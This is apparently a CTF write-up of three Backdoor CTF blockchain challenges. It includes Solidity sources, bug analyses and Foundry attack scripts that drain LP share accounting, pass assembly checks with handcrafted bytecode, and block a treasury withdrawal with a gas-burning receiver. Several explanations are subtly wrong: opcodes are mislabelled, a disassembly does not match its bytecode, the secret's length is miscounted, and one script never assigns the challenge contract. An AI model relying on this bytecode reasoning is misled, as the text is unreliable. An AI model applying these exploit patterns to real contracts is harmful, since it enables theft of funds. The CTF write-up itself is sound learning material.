+++
title = "Backdoor CTF 2024"
date = "2024-12-23"

[taxonomies]
tags=["ctf", "blockchain"]

+++

Back to CTF's to be sharper in problem solving. I played <a href="https://ctftime.org/event/2540" target=_blank>Backdoor CTF 2023</a> with our amazing team <a href="https://ctftime.org/team/364723" target=_blank>Infobahn</a>. We got **`4th`** place in this CTF. I solved few Blockchain challs as usual. Solutions,

# Curvy Pool

No description required, `isSolved()` is the problem statement for us (most of the time).

{% note(clickable=true, hidden=true, header="Setup.sol") %}

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {ERC20} from "./ERC20.sol";
import {Pool} from "./Pool.sol";

// Dummy WETH Token
contract DummyWETH is ERC20 {
    constructor(uint256 supply) ERC20("Dummy WETH", "WETH-D") {
        _mint(msg.sender, supply);
    }
}

// Dummy PUFETH Token
contract DummyPUFETH is ERC20 {
    constructor(uint256 supply) ERC20("Dummy PUFETH", "PUFETH-D") {
        _mint(msg.sender, supply);
    }
}

// Deployment Script
contract Setup {
    mapping(address => bool) public hasClaimedWETH;
    mapping(address => bool) public hasClaimedPUFETH;
    DummyWETH private wethToken = new DummyWETH(11 ether);
    DummyPUFETH private pufethToken= new DummyPUFETH(11 ether);
    Pool public immutable pool = new Pool(address(wethToken), address(pufethToken), 0);
    constructor() payable{
        // Deploy Dummy Tokens

         // Deploy Pool

        // Approve and add liquidity
        wethToken.approve(address(pool), 10 ether);
        pufethToken.approve(address(pool), 10 ether);

        pool.addLiquidity(10 ether, 10 ether);

        // Log addresses for reference
        // console.log("WETH-D Token:", address(wethToken));
        // console.log("PUFETH-D Token:", address(pufethToken));
        // console.log("Pool:", address(pool));

    }

    function claimWETH() external {
        require(!hasClaimedWETH[msg.sender], "Already claimed WETH");
        hasClaimedWETH[msg.sender] = true;
        wethToken.transfer(msg.sender,1 ether);

        
    }

    function claimPUFETH() external {
        require(!hasClaimedPUFETH[msg.sender], "Already claimed PUFETH");
        hasClaimedPUFETH[msg.sender] = true;
        pufethToken.transfer(msg.sender,1 ether);
    }

    function isSolved(address user) public view returns(bool){
        uint256 sharesHeldByPoolOwner = pool.balanceOf(address(this));
        uint256 sharesToWin = sharesHeldByPoolOwner/2;
        uint256 sharesHeldBySender = pool.balanceOf(user);

        return sharesHeldBySender > sharesToWin;
    }
}
```

{% end %}

{% note(clickable=true, hidden=true, header="Pool.sol") %}

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

import "./IERC20.sol";
import "./LiquidityToken.sol";

error Pool__InvalidTokenRatio();
error Pool__ZeroLiquidityToken();
error Pool__InvalidToken();


contract Pool is LiquidityToken {

    IERC20 private immutable i_token0;
    IERC20 private immutable i_token1;

    uint256 private s_reserve0;
    uint256 private s_reserve1;


    uint8 private immutable i_fee;

    event AddedLiquidity(
        uint256 indexed liquidityToken,
        address token0,
        uint256 indexed amount0,
        address token1,
        uint256 indexed amount1
    );

    event RemovedLiquidity(
        uint256 indexed liquidityToken,
        address token0,
        uint256 indexed amount0,
        address token1,
        uint256 indexed amount1
    );

    event Swapped(
        address tokenIn,
        uint256 indexed amountIn,
        address tokenOut,
        uint256 indexed amountOut
    );

    constructor(
        address token0,
        address token1,
        uint8 fee
    ) LiquidityToken("Backdoor Token", "BT") {
        i_token0 = IERC20(token0);
        i_token1 = IERC20(token1);
        i_fee = fee;
        s_reserve0 = 0;
        s_reserve1 = 0;
        i_token0.approve(address(this), type(uint256).max);
        i_token1.approve(address(this), type(uint256).max);
    }

    

    function _updateLiquidity(uint256 reserve0, uint256 reserve1) internal {
        s_reserve0 = reserve0;
        s_reserve1 = reserve1;
    }

    function swap(address _tokenIn, uint256 amountIn) external {
        // Objective: To Find amount of Token Out
        (uint256 amountOut, uint256 resIn, uint256 resOut, bool isToken0) = getAmountOut(_tokenIn, amountIn);

        IERC20 token0 = i_token0; // gas optimization
        IERC20 token1 = i_token1; // gas optimization

        (uint256 res0, uint256 res1, IERC20 tokenIn, IERC20 tokenOut) = isToken0
            ? (resIn + amountIn, resOut - amountOut, token0, token1)
            : (resOut - amountOut, resIn + amountIn, token1, token0);
        bool success = tokenIn.transferFrom(msg.sender, address(this), amountIn);
        require(success, "Swap Failed");

        _updateLiquidity(res0, res1);
        tokenOut.transfer(msg.sender, amountOut);

        emit Swapped(address(tokenIn), amountIn, address(tokenOut), amountOut);
    }



    function addLiquidity(uint256 amount0, uint256 amount1) external {
        uint256 reserve0 = s_reserve0; // gas optimization
        uint256 reserve1 = s_reserve1; // gas optimization
        if (amount0 < 0 || amount1 < 0) {
            revert Pool__InvalidTokenRatio();
        }

        IERC20 token0 = i_token0; // gas optimization
        IERC20 token1 = i_token1; // gas optimization

        token0.transferFrom(msg.sender, address(this), amount0);
        token1.transferFrom(msg.sender, address(this), amount1);

        uint256 liquidityTokens = ((amount0*amount0) + (amount1*amount1))/(1 ether);

        if (liquidityTokens == 0) revert Pool__ZeroLiquidityToken();
        _mint(msg.sender, liquidityTokens);
        _updateLiquidity(reserve0 + amount0, reserve1 + amount1);

        emit AddedLiquidity(
            liquidityTokens,
            address(token0),
            amount0,
            address(token1),
            amount1
        );
    }

    function removeLiquidity(uint256 liquidityTokens) external {
        (uint256 amount0, uint256 amount1) = getAmountsOnRemovingLiquidity(liquidityTokens);

        _burn(msg.sender, liquidityTokens);
        _updateLiquidity(s_reserve0 - amount0, s_reserve1 - amount1);

        IERC20 token0 = i_token0; // gas optimization
        IERC20 token1 = i_token1; // gas optimization

        token0.transfer(msg.sender, amount0);
        token1.transfer(msg.sender, amount1);

        emit RemovedLiquidity(
            liquidityTokens,
            address(token0),
            amount0,
            address(token1),
            amount1
        );
    }

    function getAmountsOnRemovingLiquidity(uint256 liquidityTokens) public view returns(uint256 amount0, uint256 amount1){
        require(liquidityTokens > 0, "0 Liquidity Tokens");
        amount0 = liquidityTokens/2;
        amount1 = liquidityTokens/2;
    }

    function getAmountOut(
        address _tokenIn,
        uint amountIn
    ) public view returns (uint, uint , uint , bool) {
        require(
            _tokenIn == address(i_token0) || _tokenIn == address(i_token1),
            "Invalid Token"
        );

        bool isToken0 = _tokenIn == address(i_token0) ? true : false;

        uint256 reserve0 = s_reserve0; // gas optimization
        uint256 reserve1 = s_reserve1; // gas optimization

        (
            uint256 resIn,
            uint256 resOut
        ) = isToken0
                ? (reserve0, reserve1)
                : (reserve1, reserve0);

        uint256 amountInWithFee = (amountIn * (10000 - i_fee)) / 10000;
        uint256 amountOut = amountInWithFee;
        return (amountOut, resIn, resOut, isToken0);
    }

    function getReserves() public view returns (uint256, uint256) {
        return (s_reserve0, s_reserve1);
    }

    function getTokens() public view returns (address, address) {
        return (address(i_token0), address(i_token1));
    }

    function getFee() external view returns (uint8) {
        return i_fee;
    }

}
```

{% end %}


{% note(clickable=true, hidden=true, header="LiquidityToken.sol") %}

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "./ERC20.sol";

contract LiquidityToken is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}
}

```

{%end%}

## Solution

First of all understaning protocol setup is necessary for any DeFi challenge. Seems like the challenge is mentioning about Curve pool and we have a liquidity token and a pool contract. 
The `Pool` contract have the basic swap, add and remove liquidity functions to swap for tokens, adding and removing liquidity in the pool. 
The two tokens in the pool are `WETH` and `PuffETH`. 

Intially in `setUp` contract minted 11 ether of tokens `WETH` and `PuffETH` and provided liquidity to `Pool` contract. 
Setup contract has two claim functions to claim 1 ether of `WETH` and `PuffETH` tokens for us. To solve this challenge we need to hold more than half of the shares held by owner.

Owner provided 10 ether of each token to the pool, but we have only 1 ether of each, as soon as the protocol is secured we can't actually do this. But we know there is a bug :)

Let's find it. 

Points to note in the protocol 

- In the `swap()` function we can swap one token at a time. No flash loan kind of thing (Uniswap)
- `addLiquidity()` function was checking the in tokens ratios incorrectly, `if (amount0 < 0 || amount1 < 0)` this improper check will allow us to add `0` amount of liquidity of a token.
- This line `uint256 liquidityTokens = ((amount0*amount0) + (amount1*amount1))/(1 ether)` is calculating the liquidity tokens to mint for us. To get more LP tokens we can make amount0 or amount1 soo bigger then the square of will be even big and it will be devided by 1 ether, but we will get decent number of LP tokens.
- The `removeLiquidity()` function will transfer both the tokens equally (`liquidityTokens/2`).

So, now what we can do is, we will swap our `WETH` completely for `PuffETH` token and then we provide liquidity of `PuffETH` token only so that we can make `liquidityTokens` somewhat higher in calculation.
Then we remove the liquidity to get equal amount of `WETH` and `PuffETH` tokens. We will continue this for 2 iterations, so we will get more than 10 ether of `WETH` and `PuffETH` tokens. At last providing liquidity of both tokens to the pool
will mint us more LP tokens than owner. 

{% note(clickable=true, hidden=true, header="Solve.s.sol") %}

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "lib/forge-std/src/Script.sol";
import {Setup, DummyWETH, DummyPUFETH} from "../src/Setup.sol";
import {Pool} from "../src/Pool.sol";
import {LiquidityToken} from "../src/LiquidityToken.sol";
import {ERC20} from "../src/ERC20.sol";

contract SolveScript is Script {
    Setup public set = Setup(0xa8e2ccc88E1DE035FD0BF796D9Aad250b8e6e9EB);
    address public user = 0x07009df29BE4772dD6FF1b1166e3598840290e4f;
    Pool public pool;
    DummyWETH  public wethToken;
    DummyPUFETH  public pufethToken;
    function run() public {
        vm.startBroadcast(0xa69081d2dbfafc79223895b25b0317a5dc473f617ba900b482c2664af6025a50);
        pool = set.pool();
        (address weth, address pufeth) = pool.getTokens();
        wethToken = DummyWETH(weth);
        pufethToken = DummyPUFETH(pufeth);
        // set.claimPUFETH();
        // set.claimWETH();

        console.log("User : ", msg.sender);
        console.log("User DummyWETH balance :", wethToken.balanceOf(user));
        console.log("User DummyPUFETH balance :", pufethToken.balanceOf(user));
        console.log("User LiquidityToken balance :", pool.balanceOf(user));
        console.log("Setup LiquidityToken balance :", pool.balanceOf(address(set)));

        console.log("iFee :", pool.getFee());

        wethToken.approve(address(pool), type(uint256).max);
        pufethToken.approve(address(pool), type(uint256).max);
        
        uint256 lpBal = pool.balanceOf(user);
        for(uint8 i; i<2; i++){
            uint256 wethBal = wethToken.balanceOf(user);
            pool.swap(address(wethToken), wethBal);
            uint256 pufethBal = pufethToken.balanceOf(user);
            pool.addLiquidity(0 ether, pufethBal);
            lpBal = pool.balanceOf(user);
            pool.removeLiquidity(lpBal);
        }
        uint256 pufethBal = pufethToken.balanceOf(user);
        uint256 wethBal = wethToken.balanceOf(user);
        pool.addLiquidity(wethBal,pufethBal);
        lpBal = pool.balanceOf(user);
        
        console.log("User DummyWETH balance :", wethToken.balanceOf(user));
        console.log("User DummyPUFETH balance :", pufethToken.balanceOf(user));

        console.log("User DummyWETH balance :", wethToken.balanceOf(user));
        console.log("User DummyPUFETH balance :", pufethToken.balanceOf(user));
        console.log("User LiquidityToken balance :", pool.balanceOf(user));
        console.log("Setup LiquidityToken balance :", pool.balanceOf(address(set)));


        console.log("isSolved() :", set.isSolved(user));
        vm.stopBroadcast();
    }
}
```

{% end %}

# Runing attack script
forge script script/Solve.s.sol:SolveScript --rpc-url <RPC_URL> --broadcast

# EasyPeasy

{% note(clickable=true, hidden=true, header="Setup.sol") %}

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "./challenge.sol";

contract Setup {
    Challenge public challenge;
    constructor() payable{
        challenge = new Challenge();
    }
    function isSolved() external view returns (bool) {
        return challenge.solved();
    }
}
```

{% end %}


{% note(clickable=true, hidden=true, header="Challenge.sol") %}

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Challenge {

    bytes32 private constant stick = 0xd4fd4e189132273036449fc9e11198c739161b4c0116a9a2dccdfa1c492006f1;
    uint256 private constant maxCodeSize = 30;
    bool public solved=false;

    function func(bytes memory input) external payable {

        address addr;
        bytes4 value4;
        uint256 codeSize;
        uint combined;

        assembly {
            let base := add(input, 0x20)
            let first20 := shr(96, mload(base))
            addr := first20

            codeSize := extcodesize(addr)
            if gt(codeSize, maxCodeSize) {
                revert(0, 0)
            }

            let data := mload(add(input, 0x34))       
            value4 := data

            let value := callvalue()
            let value1 := value
            let value3 := 0
            let value2 := 0
            
            for { } gt(value1, 0) { value1 := shr(1, value1) } {
                value3 := shl(1, value3)
                value3 := or(value3, and(value1, 1))
            }
            let bool1 := eq(value, value3)

            value1 := value
            for { } gt(value1, 0) { value1 := and(value1, sub(value1, 1)) } {
                value2 := add(value2, 1)
            }
            let bool2 := or(lt(value2, 4), eq(value2, 3))
            combined := and(bool1, bool2)
            }
            require(combined==1, "Condition failed");

        (bool success1, bytes memory ret1) = addr.call("");
        require(success1, "Call failed");
        require(ret1.length > 0, "No return data");
        bytes1 retValue1 = bytes1(ret1[0]);
        require(retValue1 == "L", "Invalid return value");

        (bool success2, bytes memory ret2) = addr.call{value: msg.value}("");
        require(success2, "Call failed");
        require(ret2.length > 0, "No return data");
        bytes1 retValue2 = bytes1(ret2[0]);
        require(retValue2 == "M", "Invalid return value");

        bytes32 hashedValue = keccak256(abi.encodePacked(value4));
        require(hashedValue == stick, "Hash mismatch");

        solved = true;
    }
}
```

{% end %}

## Solution

Solution is simple, we need to call `func()` function on `Challenge` contract. 
And we have to pass through all the checks and reach the last line of execution to solve this.

We need to pass a `bytes` input that satisfies all the conditions written in assembly. 

Let's analyze the challenge and its solution step by step.

### Challenge Analysis

The challenge has several checks we need to pass:

1. **Code Size Check**:
```solidity
codeSize := extcodesize(addr)
if gt(codeSize, maxCodeSize) {
    revert(0, 0)
}
```
Our deployed contract must be less than 30 bytes in size.

2. **Value Checks**:
```solidity
let value := callvalue()
let value1 := value
let value3 := 0
let value2 := 0

// First check: value must be palindrome in binary
for { } gt(value1, 0) { value1 := shr(1, value1) } {
    value3 := shl(1, value3)
    value3 := or(value3, and(value1, 1))
}
let bool1 := eq(value, value3)

// Second check: value must have exactly 2 bits set
value1 := value
for { } gt(value1, 0) { value1 := and(value1, sub(value1, 1)) } {
    value2 := add(value2, 1)
}
let bool2 := or(lt(value2, 4), eq(value2, 3))
```
We need to send exactly 3 wei (which has 2 bits set and is palindrome in binary).

3. **Return Value Checks**:
```solidity
require(retValue1 == "L", "Invalid return value");  // First call
require(retValue2 == "M", "Invalid return value");  // Second call with value
```
Our contract must return "L" on normal call and "M" when called with value.

4. **Hash Check**:
```solidity
bytes32 hashedValue = keccak256(abi.encodePacked(value4));
require(hashedValue == stick, "Hash mismatch");
```
The `value4` (deadbeef) must hash to the specified stick value.

### Solution Explanation

Let's break down our solution:
1. First, we deploy a minimal contract that satisfies all conditions. The bytecode is:
```
6018600c60003960186000f33415600e57604d5f526020601ff35b604c5f526020601ff3
```

Let's decode this bytecode:

```
60 18       // PUSH1 0x18 (24 bytes)
60 0c       // PUSH1 0x0c (12 bytes)
60 00       // PUSH1 0x00
39          // CODESIZE
60 18       // PUSH1 0x18
60 00       // PUSH1 0x00
f3          // RETURN
34          // CALLVALUE
15          // ISZERO
60 0e       // PUSH1 0x0e
57          // JUMPI
60 4d       // PUSH1 0x4d ('M')
5f          // PUSH0
52          // MSTORE
60 20       // PUSH1 0x20
60 1f       // PUSH1 0x1f
f3          // RETURN
```

This bytecode creates a contract that:
1. Returns "L" when called normally
2. Returns "M" when called with value
3. Is exactly 24 bytes in size (satisfying the size check)
4. Has proper control flow to handle both cases

The contract logic:
1. If CALLVALUE is 0 (normal call):
   - Store "L" in memory
   - Return "L"
2. If CALLVALUE is non-zero (call with value):
   - Store "M" in memory
   - Return "M"

### Attack Script Explanation

```solidity
contract SolveScript is Script {
    Setup public set = Setup(0x457C34237d573e6207c8f65eAcc2f48dDa2ddD12);
    Challenge public challenge;

    function run() public {
        // Deploy our minimal contract
        AttackDeployer attack = new AttackDeployer();
        address addr = attack.exploit();
        
        // Create input with our contract address and deadbeef
        bytes memory input = abi.encodePacked(address(addr), hex"deadbeef");
        
        // Call func with 3 wei (satisfies both value checks)
        challenge.func{value: 3 wei}(input);
    }
}
```

The attack works because:
1. Our deployed contract is exactly 24 bytes (satisfying size check)
2. We send 3 wei which:
   - Has exactly 2 bits set (11 in binary)
   - Is palindrome in binary (11)
3. Our contract returns correct values based on callvalue
4. The deadbeef value hashes to the required stick value

This is a great example of EVM bytecode optimization and understanding low-level contract behavior. The challenge tests knowledge of:
- EVM opcodes and bytecode
- Contract deployment and size constraints
- Binary number properties
- Contract return value handling
- Memory operations in EVM

The flag `h4v333_y0uuuu_r34d_EVMMM?` is well deserved for anyone who can solve this challenge!

# Betray 


{% note(clickable=true, hidden=true, header="Setup.sol") %}

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Challenge.sol";

contract Setup {
    address public immutable master;
    Treasury public treasury;
    SecretChecker public secretChecker;

    constructor() payable {
        master = msg.sender;
        treasury = new Treasury{value : 1 ether}(msg.sender);
        secretChecker = new SecretChecker();
    }

    function isSolved() public returns (bool) {
        (bool MasterCanWithdraw, ) = address(treasury).call{gas : 1000000}(abi.encodeWithSignature("withdraw()"));
        bool IKnowTheSecret = secretChecker.SecretIsLeaked();  
        return (!MasterCanWithdraw) && IKnowTheSecret;   
    }    

    receive() external payable {}
}
```

{% end %}


{% note(clickable=true, hidden=true, header="Challenge.sol") %}

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Servant {
    function spillSecret() external view returns (bytes32);
}

// Master uses the below contract to pay your salary

contract Treasury {
    address public servant; 
    address public immutable master;
    uint256 public timesWithdrawn;
    mapping(address => uint256) servantBalances; 

    constructor(address _master) payable{
        master = _master;
    }

    function withdraw() public {
        uint256 dividend = address(this).balance / 100;

        servant.call{value: dividend}("");
        payable(master).transfer(dividend);

        timesWithdrawn++;
        servantBalances[servant] += dividend;
    }

    function BecomeServant(address _servant) external {
        servant = _servant;
    }

    function remainingTreasure() public view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {}
}

contract SecretChecker {
    bool public SecretIsLeaked;
    mapping (bytes32 => bool) public attempted;

    function IKnowTheSecret(address _servant) public {
    require(!attempted[keccak256(abi.encodePacked(_servant))], "Won't give another chance :p");
    
    uint256 length;
    assembly {
        length := extcodesize(_servant)
    }
    require(length <= 20, "HaHa! try again xD");

    Servant servant = Servant(_servant);
    bytes32 encodedSecret = servant.spillSecret();
    bytes32 secret = bytes32(abi.encodePacked("I'm_L0yal;)")) >> (24 * 7);
    require(keccak256(abi.encodePacked(secret)) == keccak256(abi.encodePacked(encodedSecret)), "You don't know the secret!");

    attempted[keccak256(abi.encodePacked(_servant))] = true;
    SecretIsLeaked = true;
    }
}

```

{% end %}

This challenge involves a Treasury contract that pays dividends to a servant and a master. The goal is to:
1. Make the master unable to withdraw funds (revert the withdraw call)
2. Leak the secret from the servant

## Solution

Looking at the `isSolved()` function in Setup.sol:
```solidity
function isSolved() public returns (bool) {
    (bool MasterCanWithdraw, ) = address(treasury).call{gas : 1000000}(abi.encodeWithSignature("withdraw()"));
    bool IKnowTheSecret = secretChecker.SecretIsLeaked();  
    return (!MasterCanWithdraw) && IKnowTheSecret;   
}    
```

We need to satisfy two conditions:
1. `!MasterCanWithdraw`: The master's withdraw call must revert
   - This means our servant contract must make the `withdraw()` function revert
   - We can do this by making our `receive()` function consume all gas

2. `IKnowTheSecret`: The secret must be leaked
   - We need to deploy a contract that returns the correct secret
   - The contract must be ≤ 20 bytes in size
   - The secret is "I'm_L0yal;)" shifted right by 24*7 bits

The key contracts are:
- `Treasury`: Manages funds and pays dividends
- `SecretChecker`: Verifies if the secret is leaked
- `Servant`: Interface that requires implementing `spillSecret()`

The vulnerability lies in the `withdraw()` function of the Treasury contract, which uses a low-level call to send funds to the servant without checking the return value. This allows us to deploy a malicious contract that can revert the transaction when receiving funds.

## Solution

Let's analyze the vulnerability and solution in detail:

### Vulnerability Analysis

1. **Treasury Contract Vulnerability**:
```solidity
function withdraw() public {
    uint256 dividend = address(this).balance / 100;
    servant.call{value: dividend}("");  // No return value check!
    payable(master).transfer(dividend);
    timesWithdrawn++;
    servantBalances[servant] += dividend;
}
```
The key vulnerability is in the `withdraw()` function:
- It uses a low-level `call` to send funds to the servant
- The return value is not checked
- If the servant's `receive()` function reverts, the master's transfer never happens
- We can exploit this by making our servant contract revert on receive

2. **SecretChecker Requirements**:
```solidity
function IKnowTheSecret(address _servant) public {
    require(!attempted[keccak256(abi.encodePacked(_servant))], "Won't give another chance :p");
    uint256 length;
    assembly {
        length := extcodesize(_servant)
    }
    require(length <= 20, "HaHa! try again xD");
    Servant servant = Servant(_servant);
    bytes32 encodedSecret = servant.spillSecret();
    bytes32 secret = bytes32(abi.encodePacked("I'm_L0yal;)")) >> (24 * 7);
    require(keccak256(abi.encodePacked(secret)) == keccak256(abi.encodePacked(encodedSecret)), "You don't know the secret!");
}
```
We need to:
- Deploy a contract ≤ 20 bytes
- Implement `spillSecret()` to return the correct secret
- The secret is "I'm_L0yal;)" shifted right by 24*7 bits


1. **Preventing Master's Withdrawal**:
- We need to make the `withdraw()` function revert when sending funds to our servant
- We can do this by implementing a `receive()` function that consumes all gas
- An infinite loop in `receive()` will cause the transaction to revert
- This prevents the master's transfer from happening

2. **Leaking the Secret**:
- We need to deploy a minimal contract that:
  - Is exactly 20 bytes in size
  - Returns the correct secret when `spillSecret()` is called
  - The secret is "I'm_L0yal;)" shifted right by 24*7 bits

3. **Attack Flow**:
1. Deploy our malicious contract that:
   - Has a gas-consuming `receive()` function
   - Returns the correct secret
2. Set our contract as the servant
3. Call `withdraw()` which will:
   - Send funds to our contract
   - Our `receive()` function will revert
   - Master's transfer never happens
4. Verify the secret with `SecretChecker`


### Writing the Required Smart Contract in Bytecode

Let's understand how we craft the minimal contract that satisfies all requirements:

1. **Understanding Requirements**:
```solidity
// From SecretChecker.sol
require(length <= 20, "HaHa! try again xD");  // Contract must be ≤ 20 bytes
bytes32 secret = bytes32(abi.encodePacked("I'm_L0yal;)")) >> (24 * 7);  // Required secret
```

2. **Breaking Down the Secret**:
```solidity
// Original string: "I'm_L0yal;)"
// Length: 10 bytes
// After right shift by 24*7 bits:
// 0x00000000000000000000000000000000000000000049276d5f4c3079616c3b29
```

3. **Writing the Contract in Bytecode**:

First, let's write the initialization code:
```
60 14       // PUSH1 0x14 (20 bytes)
60 0c       // PUSH1 0x0c (12 bytes)
60 00       // PUSH1 0x00
39          // CODESIZE
60 14       // PUSH1 0x14
60 00       // PUSH1 0x00
f3          // RETURN
```
This ensures our contract is exactly 20 bytes.

Now, let's write the runtime code:
```
6a          // PUSH10 (push 10 bytes)
49 27 6d 5f 4c 30 79 61 6c 3b 29  // "I'm_L0yal;)" (the secret)
60 00       // PUSH1 0x00 (memory offset)
52          // MSTORE (store in memory)
60 20       // PUSH1 0x20 (32 bytes)
60 00       // PUSH1 0x00 (memory offset)
f3          // RETURN (return the secret)
```

4. **Combining the Bytecode**:
```
// Initialization code (12 bytes)
6014600c60003960146000f3

// Runtime code (8 bytes)
6a49276d5f4c3079616c3b2960005260206000f3

// Combined (20 bytes)
6014600c60003960146000f36a49276d5f4c3079616c3b2960005260206000f3
```

5. **How it Works**:
- When deployed:
  1. Initialization code runs first
  2. Returns exactly 20 bytes of code
  3. Runtime code is what remains after deployment
- When `spillSecret()` is called:
  1. Runtime code executes
  2. Pushes "I'm_L0yal;)" onto stack
  3. Stores it in memory
  4. Returns it as the secret

6. **Verifying the Size**:
```solidity
// In SecretChecker.sol
uint256 length;
assembly {
    length := extcodesize(_servant)
}
require(length <= 20, "HaHa! try again xD");
```
Our contract is exactly 20 bytes, satisfying this check.

7. **Verifying the Secret**:
```solidity
// In SecretChecker.sol
bytes32 encodedSecret = servant.spillSecret();
bytes32 secret = bytes32(abi.encodePacked("I'm_L0yal;)")) >> (24 * 7);
require(keccak256(abi.encodePacked(secret)) == keccak256(abi.encodePacked(encodedSecret)));
```
Our contract returns "I'm_L0yal;)" which, when shifted right by 24*7 bits, matches the required secret.


### Solution Script

{% note(clickable=true, hidden=true, header="SolveScript.s.sol") %}

```solidity
contract SolveScript is Script {
    Setup public set = Setup(payable(0x5a825D1C0B1cE08dAd551a73a180785598FD22eE));
    SecretChecker public secretChecker;
    Treasury public treasury;

    function setUp() public {}

    function run() public {
        vm.startBroadcast(0x0abccce2d992649ac814a88542efa920523c780b101babc97ff79651a4652ff1);
        secretChecker = set.secretChecker();
        treasury = set.treasury();
        AttackDeployer attack = new AttackDeployer();
        address servant = attack.exploit();
        treasury.BecomeServant(address(attack));
        treasury.withdraw();

        secretChecker.IKnowTheSecret(servant);
        console.log("SecretIsLeaked : ", secretChecker.SecretIsLeaked());

        vm.stopBroadcast();
    }
}

contract AttackDeployer {
    function exploit() public returns (address) {
         //    bytes32 secret = bytes32(abi.encodePacked("I'm_L0yal;)")) >> (24 * 7); //0x00000000000000000000000000000000000000000049276d5f4c3079616c3b29
    //    console.logBytes32(secret);
    // RUNTIME : 6a49276d5f4c3079616c3b2960005260206000f3  // 6a49276d5f4c3079616c3b29600052600b6015f3
    // INIT: 6014600c60003960146000f3 6a49276d5f4c3079616c3b2960005260206000f3
        bytes memory bytecode = hex"6014600c60003960146000f36a49276d5f4c3079616c3b2960005260206000f3";
        address _solver;
        uint256 _size;
        
        assembly {
            _solver := create(0, add(bytecode, 0x20), mload(bytecode))
            _size := extcodesize(_solver)
        }
        require(_solver != address(0));
        console.log("Code size : ", _size);
        return _solver;
    }
    
    receive() external payable {
        uint256 a = 2;
        while (true) {
            a = a * a;
        }   
    }
}
```

{%end%}

The flag `r3venge_t4k3n_5ucc3s5fu11y!;)` is well deserved for this clever exploit that combines multiple concepts in smart contract security!

***

Thanks to making it this far!
